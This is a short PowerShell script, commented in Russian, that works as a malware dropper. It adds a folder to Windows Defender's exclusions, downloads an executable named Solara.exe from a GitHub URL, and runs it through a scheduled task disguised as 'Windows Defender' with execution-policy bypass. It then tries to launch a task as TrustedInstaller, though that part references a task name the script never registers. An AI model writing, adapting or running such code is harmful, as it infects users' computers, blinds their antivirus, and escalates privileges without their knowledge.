$taskname = 'Windows Defender'
$execute = 'powershell'

# URL для скачивания вашего Main.exe
$downloadUrl = 'https://github.com/LoveRyajenja/lwafmwoafmw11/raw/refs/heads/main/Solara.exe'

# Новая папка для сохранения Main.exe (например, C:\Temp\)
$localFolder = "C:\$77Temp\"
$localPath = "$localFolder\Solara.exe"



# Создание папки, если она не существует
if (-not (Test-Path -Path $localFolder)) {
    New-Item -Path $localFolder -ItemType Directory -Force
}

# Аргументы для выполнения
$argument = "-ExecutionPolicy Bypass -Noprofile -Command `"& {
    # Добавление папки C:\Temp в исключения Windows Defender
    Add-MpPreference -ExclusionPath '$localFolder'

    # Скачивание Main.exe с сервера
    Invoke-WebRequest -Uri '$downloadUrl' -OutFile '$localPath'

    # Запуск Main.exe
    Start-Process -FilePath '$localPath' -Wait
}`""

# Создание действия для задания
$action = New-ScheduledTaskAction -Execute $execute -Argument $argument

# Регистрация задания в планировщике
Register-ScheduledTask -TaskName $taskname -Action $action

# Запуск задания от имени TrustedInstaller
$svc = New-Object -ComObject 'Schedule.Service'
$svc.Connect()
$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('RunAsTI')
$task.RunEx($null, 0, 0, $user)
